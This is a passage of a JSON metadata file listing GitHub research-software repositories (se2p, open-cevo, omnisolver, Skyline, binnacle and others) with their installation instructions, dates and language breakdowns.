                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-04T16:31:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 114460
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 26049
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2897
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "42": {
        "filename": "se2p_artifact-scam2021_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/se2p/artifact-scam2021",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Set up a Python virtual environment at some arbitrary path\u2014referenced as\n*<path>* from now.\nMake sure to use Python 3!\nTo execute the execution pipeline you need to have the virtual environment\nactive.\n```\nvirtualenv -p python3 <path>\nsource <path>/bin/activate\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparations",
                    "parent_header": [
                        "Experiment Execution"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/se2p/artifact-scam2021/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The following assumes that you have a terminal window open with a prompt\nin the directory of this file.\n \n",
                    "original_header": "Experiment Execution"
                },
                "confidence": 0.9966162550350272,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/artifact-scam2021/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Execute the script `./run_everything.sh`.\nIt will clone the LitterBox repository,\ncheckout revision `6b193f88`,\nbuild LitterBox,\ncopy the JAR archive to the expected location,\nexecute the runs,\nand create a `results.csv` in the `data` folder.\nAfterwards, the statistical evaluation can be\nperformed by exeuction the Jupyter Notebook\nscript in the `analysis` folder. \n",
                    "original_header": "Execution"
                },
                "confidence": 0.9999968515724158,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/artifact-scam2021/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-08-13T06:16:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-07-14T07:05:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 403277
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 96112
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3626
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1733
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "43": {
        "filename": "xlab-uiuc_open-cevo_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/xlab-uiuc/open-cevo",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Please use python3 to install the dependencies and run the code(we use python 3.8.5). \n1. Install dependenceis\n~~~bash\npip3 install pathlib\npip3 install nltk\npip3 install beautifulsoup4\n~~~ \n3. Run  \n```bash\npython3 commit_selection.py\n``` \nto automtically select commits that touch configuration. The out put will be `commit_selected.txt` that has structured info for each selected commit, and the info contains hints that how this diff touches configuration. **By search those hints in the diff file, one can quickly locate/briefly understant the configuration change.** \n~~~\nHDFS-13607. [SBN read] Edit Tail Fast Path Part 1                                   //commit title\nhttps://github.com/apache/hadoop/commit/c81ac2ff0220b180cd6cbbf18221290c3783bfd5    //commit link\n2018-05-09T22:40:07Z                                                                //commit time\nCommit message touches config:False                                                 //whether commit message touch \"config\" keyword\nDiff touches config define:True                                                     //whether diff touches config define\nDiff touches config loading:True                                                    //whether diff touches config load\nDiff touches config setting:False                                                   //whether diff touches config set\nDiff touches config variable (data flow):True                                       //whether diff touches config variable\nDiff touches config message:False                                                   //whether diff touches message that have \"config\" keyword \nWe provide a [demo](https://github.com/xlab-uiuc/open-cevo/tree/main/code/hdfs_demo_examples) (The above case is in that demo) for all HDFS commit examples in [commit_study.md (tutorial)](https://github.com/xlab-uiuc/open-cevo/blob/main/commit_study.md), they are HDFS-13607, HDFS-12291, HDFS-12412, HDFS-11998, HDFS-12716, HDFS-11576 and HDFS-12603. Run `commit_selection.py` in `/code/hdfs_demo_examples` to see `commit_selected.txt` and the structured info for each commit.\n~~~bash\ncd code/hdfs_demo_examples\npython3 commit_selection.py\n~~~ \n",
                    "original_header": "2.1 Collect raw commits that touch configuration"
                },
                "confidence": 0.9883667559207842,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/xlab-uiuc/open-cevo/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-01-11T19:17:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-09T12:38:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 144314
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "44": {
        "filename": "euro-hpc-pl_omnisolver_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/euro-hpc-pl/omnisolver",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Installing this package alone won't give you much benefit, unless of course you want to develop new omnisolver plugins. In that case, you can install `omnisolver` from pip:\n\n```shell\npip install omnisolver\n```\n\nAlgorithms for solving QUBO and Ising models are implemented in Omnisolver *plugins*. For instance, to use parallel tempering algorithm you need to install the `omnisolver-pt` package:\n\n```shell\npip install omnisolver-pt\n```\n\nYou can run the `omnisolver pt -h` command to see the command line usage.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation and getting started"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/euro-hpc-pl/omnisolver/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-06-25T08:40:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-24T18:45:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 19830
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "45": {
        "filename": "skylineprof_skyline_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/skylineprof/skyline",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "---\nid: install\ntitle: Installing Skyline\n---\n\n### Requirements\n\nSkyline works with GPU-based neural networks that are implemented in PyTorch.\nTo run Skyline, you need:\n\n- A system equipped with an NVIDIA GPU\n- PyTorch 1.1.0+\n- Python 3.6+\n\nNote that Skyline only supports profiling models that are trained using a GPU.\n\nSkyline consists of two components: (i) the Skyline profiler, and (ii) a plugin\nfor Atom. The Skyline profiler has only been tested on Ubuntu 18.04, but should\nalso work on other versions of Ubuntu that have Python 3.6+. The Skyline plugin\nhas been tested on both Ubuntu 18.04 and macOS Mojave (10.14) with the latest\nversion of Atom.\n\n\n### Installation\n\nFor interactive profiling (i.e. Skyline inside Atom), you need both components.\nIf you only plan to use Skyline for [Standalone Profiling](standalone.md), you\nonly need the Skyline profiler component.\n\n#### Skyline Profiler\n\nThe Skyline profiler can be installed using `pip`. In your shell, run:\n\n```bash\npip install skyline-cli\n```\n\nAs with most Python packages, we recommend installing Skyline inside a\n`virtualenv`. After installing the Skyline profiler, you will be able to\ninvoke it by running `skyline` in your shell.\n\n#### Skyline Atom Plugin\n\nThe Skyline Atom plugin can be installed using `apm` (the Atom package\nmanager), which should be automatically installed after you install\n[Atom](https://atom.io). In your shell, run:\n\n```bash\napm install skyline\n```\n\nYou can alternatively install Skyline by using Atom's preferences pane and\nsearching for `skyline` under the Install section.\n\nAfter installing the Skyline plugin, the `Skyline:Toggle` command should be\navailable in your command palette. A Skyline sub-menu should also appear\nunder the \"Packages\" menu.\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/skylineprof/skyline/master/website/docs/install.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<h2 id=\"installing-skyline\">Installing Skyline</h2> \nTo run Skyline, you need: \n- A system equipped with an NVIDIA GPU\n- PyTorch 1.1.0+\n- Python 3.6+ \nSkyline is installed using `pip` and the Atom Package Manager (`apm`).\n```bash\npip install skyline-cli\napm install skyline\n```\n \nGenerally you need *both* packages to use Skyline. However, depending on your\nuse case and development setup, you may only need the `pip` package or you may\nneed to install the packages on different machines. **See the [installation\npage on the website](https://skylineprof.github.io/docs/install) for detailed\ninstallation instructions tailored to different use cases.** \nAfter installing Skyline, you will be able to invoke the command line tool by\nrunning `skyline` in your shell. \nTo get started quickly, check out the [Getting Started page on the Skyline\nwebsite](https://skylineprof.github.io/docs/getting-started). \nFor more information about using Skyline, including standalone profiling and\nsetting up a remote project, please [see the Skyline\ndocumentation](https://skylineprof.github.io/docs/). \nSkyline uses semantic versioning. Before the 1.0.0 release, backward\ncompatibility between minor versions will not be guaranteed. \nThe Skyline command line tool and plugin use *independent* version numbers.\nHowever, it is very likely that minor and major versions of the command line\ntool and plugin will be released together (and hence share major/minor version\nnumbers). \nSkyline began as a research project at the [University of\nToronto](https://web.cs.toronto.edu) in collaboration with [Tovi\nGrossman](https://www.tovigrossman.com) and [Gennady\nPekhimenko](https://www.cs.toronto.edu/~pekhimenko/).\n \n",
                    "original_header": "Installing Skyline"
                },
                "confidence": 0.9765943896934914,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skylineprof/skyline/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-02-18T17:57:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-07-20T20:50:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 160822
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 157372
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Less",
                    "name": "Less",
                    "type": "Programming_language",
                    "size": 14792
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 13021
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2497
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 543
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "46": {
        "filename": "PrivacyEngineering_janus-graphql-anonym-directives_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/PrivacyEngineering/janus-graphql-anonym-directives",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "npm install graphql-anonym-directives\r\n```\r",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "graphql-anonym-directives",
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/PrivacyEngineering/janus-graphql-anonym-directives/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-30T08:52:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-07-06T13:49:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 5124
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "47": {
        "filename": "sidongfeng_CAPdroid_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sidongfeng/CAPdroid",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "> For more details, experimental setup and results, please check the following instructions:\n> - Overall approach: [approach.md](approach/)\n> - Preliminary Study: [preliminary_study.md](preliminary_study.md)\n> - Phase 1: Action Segmentation: [action_segmentation.md](approach/action_segmentation.md)\n> - Phase 2: Action Attribute Inference: [action_attribute_inference.md](approach/action_attribute_inference.md)\n> - Phase 3: Description Generation: [description_generation.md](approach/description_generation.md) \n",
                    "original_header": "Approach"
                },
                "confidence": 0.9389133354930967,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sidongfeng/CAPdroid/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<table width=\"100%\" style=\"font-size:80%\"><tbody>\n<th valign=\"bottom\" width=\"25%\">\n    <a target=\"_blank\" href=\"https://github.com/fossasia/neurolab-android/issues/601\">NeuroLab-Issue#601</a>\n</th>\n<th valign=\"bottom\" width=\"25%\">\n    <a target=\"_blank\" href=\"https://github.com/getodk/collect/issues/3222\">Collect-Issue#3222</a>\n</th>\n<th valign=\"bottom\" width=\"25%\">\n    <a target=\"_blank\" href=\"https://github.com/ramack/ActivityDiary/issues/285\">ActivityDiary-Issue#285</a>\n</th>\n<th valign=\"bottom\" width=\"25%\">\n    <a target=\"_blank\" href=\"https://github.com/MarcusWolschon/osmeditor4android/issues/637\">Osmeditor-Issue#637</a>\n</th>\n<tr>\n<td align=\"center\">\n    <img src=\"figures/neuroLab.gif\">\n</td>\n<td align=\"center\">\n    <img src=\"figures/collect.gif\">\n</td>\n<td align=\"center\">\n    <img src=\"figures/ActivityDiary.gif\">\n</td>\n<td align=\"center\">\n    <img src=\"figures/osmeditor637.gif\">\n</td>\n</tr>\n</tbody></table> \n",
                    "original_header": "Usefulness Evaluation"
                },
                "confidence": 0.9999990675152985,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sidongfeng/CAPdroid/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-02T04:52:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-15T02:39:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "48": {
        "filename": "fla-sil_PyTorrent_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/fla-sil/PyTorrent",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Each package metadata includes the detail of Python software package. The packages have been collected from PyPI and Anaconda Package distribution. It includes features such as Software Package License, website, publisher, description and etc. Each packages saves as a JSON file.\n \n",
                    "original_header": "Metadata of all Python Packages"
                },
                "confidence": 0.9965237077252634,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fla-sil/PyTorrent/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<a href=\"https://automlpodcast.com/episode/bert-sort-how-to-use-language-models-to-semantically-order-categorical-values\"><img src=\"https://images.podcastpage.io/fetch/https%3A%2F%2Fstorage.buzzsprout.com%2Fvariants%2Flmm4qmbs2knbyqxpauluugywm8il%2F5cfec01b44f3e29fae1fb88ade93fc4aecd05b192fbfbc2c2f1daa412b7c1921.jpg?w=365&dpr=2.0\" width=\"90\"></img></a> \n",
                    "original_header": "More detail?"
                },
                "confidence": 0.9999701159637798,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fla-sil/PyTorrent/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-01-10T20:30:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-23T08:21:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "49": {
        "filename": "sillywalk_defect-prediction_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sillywalk/defect-prediction",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\nThe open source code for this work is updated here: https://github.com/sillywalk/defect-prediction/tree/dev \r\n \n",
                    "original_header": "<a href=\"https://arxiv.org/abs/1905.01719\">EMBLEM Paper</a> repository:"
                },
                "confidence": 0.9978620804138911,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sillywalk/defect-prediction/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-09-19T18:35:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-08-01T01:19:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 22128
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 18663
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 698
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "50": {
        "filename": "katealtmanova_nfoldexperiment_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/katealtmanova/nfoldexperiment",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-02-06T09:41:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-21T15:01:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 504044199
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 133149
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "51": {
        "filename": "Teiktos_bunk8s_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Teiktos/bunk8s",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. The launcher image, as well as the coordinator image must be built. The Docker image files are written in such a way, that the build contexts root directory must be the root directory of the Bunk8s repository. \n2. The launcher container image must be uploaded to a container registry from which pipeline runners can pull it so that it can be run in the pipeline. \n3. The coordinator container image must be uploaded to a container registry to which Kubernetes has access. \n4. Deploy the coordinator. It is possible to deploy it to an arbitrary namespace without affecting its functionality, however, it is recommended to deploy it into its own namespace. In order to allow for a quick setup of the coordinator, the Bunk8s repository includes a preconfigured helm chart for deployment to Kubernetes. When deployed with Helm, the coordinator is part of a deployment and therefore of a replica set. However, it is only required to set the number of replicas to one, since the gRPC server can handle multiple simultaneous test runs. \n5. A certificate for TLS must be provided to the ingress and the CAs root certificate must be placed in the `bunk8s/launcher/src/cert` directory, before building the container image. Particular attention is to be paid to the Ingress configuration in the helm chart. Depending on the used Ingress controller in the cluster the Ingresses annotations must be changed in order to enable the communication between the gRPC client and the gRPC server. \n```` yaml\nnginx.ingress.kubernetes.io/backend-protocol: \"GRPC\"\n````\n6. Create a role, that grants access to the core API, namespaces, and pod resources and assign it to the coordinator pod. For the namespace resource, the required verb is [\"get\"], while for the pod resource the required verbs are [\"get\", \"list\", \"watch\", \"create\"]. Additionally, a service account, as well as a role binding must be created and be assigned to the coordinator pod. All three parts of the role-based access control, the role, the service account, and the role binding must be created in the namespace of the coordinator.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Teiktos/bunk8s/main/README.md"
            },
            {
                "result": {
                    "value": "- Go: 1.16.5\n- Kubernetes: 1.21\n- Helm: 3.6.1\n",
                    "type": "Text_excerpt",
                    "original_header": "Utilized versions",
                    "parent_header": [
                        "Project Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Teiktos/bunk8s/main/README.md"
            },
            {
                "result": {
                    "value": "- If you open the project in VSCode with the root directory of the project as root directory of the workspace in VSCode **AND** use gopls as language server, you have to add the following entry to the ```settings.json``` of the go extension. Otherwise gopls will report an error with the multiple go modules in the repository.\n\n    ```json\n    \"gopls\": {\n        \"experimentalWorkspaceModule\": true,\n    }\n    ```\n",
                    "type": "Text_excerpt",
                    "original_header": "VSCode",
                    "parent_header": [
                        "Project Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Teiktos/bunk8s/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- 0 - Test run finished successfully\n- 1 - Namespace name invalid\n- 2 - Test runner pod name invalid or already exists in given namespace \n- 3 - Failed to create test runner pod\n- 4 - Failed to watch test runner pod\n- 5 - Test duration timed out\n \n",
                    "original_header": "The Launcher"
                },
                "confidence": 0.9787963468911851,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Teiktos/bunk8s/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-10-14T14:12:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-11-09T17:01:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 25897
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Smarty",
                    "name": "Smarty",
                    "type": "Programming_language",
                    "size": 1892
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1198
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 859
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 589
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "52": {
        "filename": "jjhenkel_binnacle-icse2020_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jjhenkel/binnacle-icse2020",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installing Binnacle\n\nTo download both the necessary scripts, infrastructure, and raw data, all you need to do is:\n\n```bash\ngit clone https://github.com/jjhenkel/binnacle-icse2020.git\n\ncd ./binnacle-icse2020\n```\n\nAll examples (unless otherwise noted) assume you are working in the directory corresponding to the root of this GitHub repository. \n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/jjhenkel/binnacle-icse2020/master/INSTALL.md"
            },
            {
                "result": {
                    "value": "Run:\n\n```bash\ngit clone https://github.com/jjhenkel/binnacle-icse2020.git\n\ncd ./binnacle-icse2020\n```\n\n**Note:** the rest of this README assumes you are working in the root directory of the `binnacle-icse2020` git repository.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Binnacle: ICSE 2020 Artifact"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/jjhenkel/binnacle-icse2020/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To reproduce our mined rules the following script can be used:\n```bash\n# To mine rules, automatically\n./experiments/2-automated-rule-mining/run.sh\n```\n \n**Note:** during testing, we've had issues with running this container on Docker installations that are running inside of a Virtual Machine (specifically, an Ubuntu VM, with Docker, on a Windows host). If you attempt to run this in a Linux VM, on a Windows host, and the container hangs, it's likely this issue. (We, unfortunately, have not found any reliable work-arounds for this issue.)\n \n",
                    "original_header": "RQ2 - Automated Rule Mining"
                },
                "confidence": 0.998907915846841,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jjhenkel/binnacle-icse2020/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you wish to run against ALL of the Dockerfiles, and not just the Gold Set, we have made that functionality available via: \n```bash\n# Runs against `gold.jsonl.xz` AND `github.jsonl.xz`\n./experiments/3-static-rule-enforcement/run.sh --full\n```\nDoing this is much slower (as the full GitHub dataset has 450x the data of the Gold set). Once complete, the following files should be present:\n \n",
                    "original_header": "RQ3 - Extras"
                },
                "confidence": 0.9065284702953665,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jjhenkel/binnacle-icse2020/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Thanks to `xz`'s excellent compressions, you already have it! \n",
                    "original_header": "Accessing our data"
                },
                "confidence": 0.9734991636110191,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jjhenkel/binnacle-icse2020/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-22T17:45:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-28T14:21:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 309123
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 103569
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 23097
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "jq",
                    "name": "jq",
                    "type": "Programming_language",
                    "size": 20843
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 9410
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 7437
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2641
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Haskell",
                    "name": "Haskell",
                    "type": "Programming_language",
                    "size": 1920
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "53": {
        "filename": "paperMaterial4_icse2024comprehending_2024-10-04.json",
        "code_repository": "No code repository found.",
        "installation_instructions": "No installation instructions found.",
        "date_created": "No date_created found.",
        "date_updated": "No date_updated found.",
        "programming_languages": "No programming languages found."
    },
    "54": {
        "filename": "DRLDeploymentChallenges-ICSME2023_ReplicationPackage_2024-10-04.json",
        "code_repository": [
            {
                "result": {
